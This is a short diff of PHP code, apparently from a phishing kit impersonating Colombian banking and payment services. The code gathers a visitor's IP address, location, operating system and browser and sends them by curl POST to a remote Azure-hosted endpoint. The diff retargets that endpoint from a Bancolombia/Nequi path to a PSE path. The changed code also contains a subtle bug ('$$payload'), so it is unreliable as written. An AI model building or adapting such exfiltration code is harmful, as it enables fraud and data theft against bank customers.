@@ -9,8 +9,8 @@ Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
 Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
 SO: ' . $user_os . '
 Navegador: ' . $navegador . '';
-  $payload = ['mensaje' => $message];
-  $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/bancolombianequi/';
+  $$payload = ['mensaje' => $message];
+  $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/pses/';
 
   $ch = curl_init($url);
   curl_setopt_array($ch, [
@@ -18,10 +18,9 @@ Navegador: ' . $navegador . '';
     CURLOPT_POST           => true,
     CURLOPT_HTTPHEADER     => [
       'Accept: application/json',
-      'Content-Type: application/json',
       'X-Client-IP: ' . $myip,
     ],
-    CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
+    CURLOPT_POSTFIELDS     => $payload, // ← ahora se envía como form-data
     CURLOPT_TIMEOUT        => 20,
     CURLOPT_CONNECTTIMEOUT => 10,
   ]);
